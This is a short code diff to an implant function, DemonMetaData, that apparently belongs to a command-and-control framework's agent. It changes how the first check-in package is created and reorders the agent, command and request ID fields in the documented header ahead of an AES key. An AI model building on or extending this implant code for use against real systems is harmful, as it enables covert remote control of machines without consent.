@@ -98,7 +98,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     /* Check we if we want to add the Agent Header + CommandID too */
     if ( Header )
     {
-        *MetaData = PackageCreate( DEMON_INITIALIZE );
+        *MetaData = PackageCreateWithMetaData( DEMON_INITIALIZE );
 
         /* Do not destroy this package if we fail to connect to the listener. */
         ( *MetaData )->Destroy = FALSE;
@@ -123,8 +123,8 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         [ SIZE         ] 4 bytes
         [ Magic Value  ] 4 bytes
         [ Agent ID     ] 4 bytes
-        [ Request ID   ] 4 bytes
         [ COMMAND ID   ] 4 bytes
+        [ Request ID   ] 4 bytes
 
      MetaData:
         [ AES KEY      ] 32 bytes
